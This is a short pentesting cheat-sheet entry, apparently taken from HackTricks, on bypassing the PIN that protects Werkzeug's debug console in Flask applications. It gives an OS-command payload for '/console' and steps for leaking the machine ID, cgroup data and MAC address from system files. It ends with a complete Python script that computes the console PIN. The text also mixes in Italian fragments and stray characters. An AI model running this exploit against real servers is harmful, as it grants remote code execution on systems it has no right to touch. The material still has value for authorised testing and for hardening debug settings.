
## Werkzeug PIN Bypass Exploit
**https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected**



If debug is active you could try to access to `/console` and gain RCE.

```python
__import__('os').popen('whoami').read();
```

In some occasions the /console endpoint is going to be protected by a pin. Here you can find how to generate this pin:
-   ​[https://www.daehee.com/werkzeug-console-pin-exploit/](https://www.daehee.com/werkzeug-console-pin-exploit/)​
-   ​[https://ctftime.org/writeup/17955](https://ctftime.org/writeup/17955)


A soldoni:
-   `username` is the user who started this Flask
-   `modname` is flask.app
-   `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` is Flask
-   `getattr(mod, '__file__', None)` is the absolute path of `app.py` in the flask directory (e.g. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). If `app.py` doesn't work, try `app.pyc`
-   `uuid.getnode()` is the MAC address of the current computer, `str (uuid.getnode ())` is the decimal expression of the mac address
-   `get_machine_id()` read the value in `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` and return directly if there is, sometimes it might be required to append a piece of information within `/proc/self/cgroup` that you find at the end of the first line (after the third slash)


To find server MAC address, need to know which network interface is being used to serve the app (e.g. `ens3`). If unknown, leak `/proc/net/arp` for device ID and then leak MAC address at `/sys/class/net/<device id>/address`.

Convert from hex address to decimal representation by running in python e.g.:

```python
>>> print(0x5600027a23ac)
94558041547692
```

Pluggare tutti i valori in:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)****
```



